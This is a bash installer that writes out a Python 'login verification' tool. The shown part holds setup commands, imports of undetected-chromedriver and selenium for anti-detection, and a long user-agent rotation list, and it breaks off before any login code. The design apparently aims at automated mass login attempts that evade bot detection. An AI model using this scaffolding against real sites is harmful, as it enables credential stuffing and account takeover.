#!/bin/bash

# ==============================================================================
# csvicsvu: Advanced Database Auditor with Autonomous Login Verification
# ==============================================================================

# Error handling
set -e

echo "[*] Initializing csvicsvu setup..."

# 1. System Update and Dependency Installation
echo "[*] Updating package lists and installing system dependencies..."
sudo apt-get update -y > /dev/null 2>&1
sudo apt-get upgrade -y > /dev/null 2>&1
sudo apt-get install -y python3 python3-venv python3-pip figlet lolcat toilet libopenblas-base chromium-browser chromium-chromedriver > /dev/null 2>&1

# 2. Virtual Environment Setup
if [ ! -d "venv" ]; then
    echo "[*] Creating virtual environment..."
    python3 -m venv venv
else
    echo "[*] Virtual environment already exists."
fi

# Activate venv for installation
source venv/bin/activate

# 3. Python Dependency Installation
# Added selenium and undetected-chromedriver for robust browser automation and anti-detection
echo "[*] Installing Python modules (pandas, openpyxl, requests, rich, beautifulsoup4, lxml, selenium, undetected-chromedriver)..."
pip install --upgrade pip > /dev/null 2>&1
pip install pandas openpyxl requests rich xlrd beautifulsoup4 lxml selenium undetected-chromedriver > /dev/null 2>&1

# 4. Generate the Python Application
echo "[*] Generating application code..."
cat << 'EOF' > csvicsvu.py
import os
import sys
import time
import re
import random
import pandas as pd
import requests
import subprocess
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, IntPrompt
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

# --- Configuration ---
LOG_FILE = "csvicsvu_log.txt"
console = Console()

# Comprehensive User-Agent Rotation (original 125 + 200 new = 325 total)
USER_AGENTS = {
    'iphone': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/143.0.7499.108 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/146.0 Mobile/15E148 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone17,5; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 FireKeepers/1.7.0',
        'Mozilla/5.0 (iPhone17,1; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Mohegan Sun/4.7.4',
        'Mozilla/5.0 (iPhone17,2; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Resorts/4.5.2',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;dubox;4.9.1;iPhone14ProMax;ios-iphone;26.1;ars_OM;JSbridge1.0.9;jointbridge;1.1.39',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;dubox;4.9.1;iPhone13ProMax;ios-iphone;26.1;en_EG;JSbridge1.0.9;jointbridge;1.1.39',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;dubox;4.9.1;iPhone11ProMax;ios-iphone;18.1.1;ar_US;JSbridge1.0.9;jointbridge;1.1.39',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/142.0.0.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/145.0 Mobile/15E148 Safari/605.1.15',
        'Mozilla/5.0 (iPhone15,2; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (iPhone14,5; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (iPhone13,2; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (iPhone12,1; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone11,8; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/141.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/144.0 Mobile/15E148 Safari/605.1.15',
        'Mozilla/5.0 (iPhone10,4; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone9,1; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (iPhone8,1; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
    ],
    'android': [
        'Mozilla/5.0 (Linux; Android 16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Android 16; Mobile; rv:68.0) Gecko/68.0 Firefox/146.0',
        'Mozilla/5.0 (Android 16; Mobile; LG-M255; rv:146.0) Gecko/146.0 Firefox/146.0',
        'Mozilla/5.0 (Linux; Android 15; SM-S931B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.116 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.103 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g(100)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.53 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 16; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    ],
    'windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.3650.80',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/143.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
    ],
    'mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:145.0) Gecko/20100101 Firefox/145.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Vivaldi/7.7.3851.58',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.0 Safari/605.1.15'
    ],
    'linux': [
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0',
        'Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux arm64; rv:146.0) Gecko/20100101 Firefox/146.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
    ],
    'motorola_5g': [
        'Mozilla/5.0 (Linux; Android 15; moto g - 2025 Build/V1VK35.22-13-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Moto g04) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g stylus 5G - 2024 Build/U2UB34.44-86; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.99 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g power 5G - 2024 Build/U1UD34.16-62; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.99 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto g stylus 5G - 2025 Build/V1VK35.22-13-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto edge 40 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g power 5G - 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g play 2024) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto edge 50 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g84 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g73 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto g85 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto edge 50 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g53 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto g55 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto edge 40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto g75 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g34 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto edge 50 ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto g04s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; moto g54 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; moto g95 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; moto edge 50 neo) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    ],
    'samsung_a': [
        'Mozilla/5.0 (Linux; Android 13; SM-A146U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/105.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A155E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A165E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A146M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-A1550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-A1650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-A1460) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36'
    ],
    'samsung_s': [
        'Mozilla/5.0 (Linux; Android 15; SM-S931U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S926U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
